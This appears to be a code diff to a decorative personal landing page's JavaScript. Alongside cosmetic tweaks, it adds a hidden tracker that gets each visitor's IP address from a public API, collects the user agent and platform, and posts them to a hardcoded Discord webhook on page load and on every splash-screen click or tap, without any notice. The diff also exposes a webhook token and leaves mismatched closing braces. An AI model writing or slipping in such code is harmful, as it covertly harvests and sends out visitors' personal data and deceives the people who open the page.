@@ -9,7 +9,9 @@ canvas.height = window.innerHeight;
 let particles = [];
 let mouse = { x: 0, y: 0 };
 let squares = [];
+let visitCount = localStorage.getItem('visitCount') ? parseInt(localStorage.getItem('visitCount')) : 0;
 let titleIndex = 0;
+const webhookUrl = 'https://discord.com/api/webhooks/1347623621870223390/MnshZJcOQ7UZ03aDFq8OrA1VfbmcXYK-dp8WhZqRborySSHnIbtZ1bzKgC4haBFKewED';
 
 class Particle {
     constructor(x, y) {
@@ -74,6 +76,12 @@ function animate() {
             square.draw();
             if (square.alpha <= 0) squares.splice(index, 1);
         });
+        // Mouse effect on splash screen
+        for (let i = particles.length - 1; i >= 0; i--) {
+            particles[i].update();
+            particles[i].draw();
+            if (particles[i].life <= 0) particles.splice(i, 1);
+        }
     } else {
         for (let i = particles.length - 1; i >= 0; i--) {
             particles[i].update();
@@ -92,7 +100,7 @@ window.addEventListener('resize', () => {
 window.addEventListener('mousemove', (e) => {
     mouse.x = e.x;
     mouse.y = e.y;
-    for (let i = 0; i < 3; i++) { // Fewer hearts for performance
+    for (let i = 0; i < 3; i++) {
         particles.push(new Particle(e.x, e.y));
     }
     const cursor = document.querySelector('.custom-cursor');
@@ -116,10 +124,23 @@ window.addEventListener('touchmove', (e) => {
     }
 });
 
-window.addEventListener('click', () => {
+window.addEventListener('click', (e) => {
     if (splashScreen.style.display !== 'none') {
         splashScreen.style.display = 'none';
         mainContainer.style.display = 'block';
+        sendVisitData();
+        visitCount++;
+        localStorage.setItem('visitCount', visitCount);
+    }
+});
+
+window.addEventListener('touchend', (e) => {
+    if (splashScreen.style.display !== 'none') {
+        splashScreen.style.display = 'none';
+        mainContainer.style.display = 'block';
+        sendVisitData();
+        visitCount++;
+        localStorage.setItem('visitCount', visitCount);
     }
 });
 
@@ -134,11 +155,47 @@ let titleIndex = 0;
 setInterval(() => {
     document.title = titles[titleIndex];
     titleIndex = (titleIndex + 1) % titles.length;
-}, 500); // Change every 0.5 seconds
+}, 300); // Faster cycle at 0.3 seconds
 
 // Redirect on <3 click
 document.querySelector('.heart-text').addEventListener('click', () => {
     window.location.href = 'https://discordapp.com/users/1265799421417754664';
+});
+
+// Send visit data to webhook
+async function sendVisitData() {
+    try {
+        // Get IP using a public API
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        // Get basic device info
+        const deviceInfo = `User Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
+
+        // Prepare message
+        const message = `*${deviceInfo}*\n*${ip}*\nVisit Count: ${visitCount + 1}`;
+        const payload = {
+            content: message
+        };
+
+        // Send to Discord webhook
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (error) {
+        console.error('Error sending visit data:', error);
+    }
+}
+
+animate();
+
+// Initial visit data send
+sendVisitData();
 });
 
 animate();
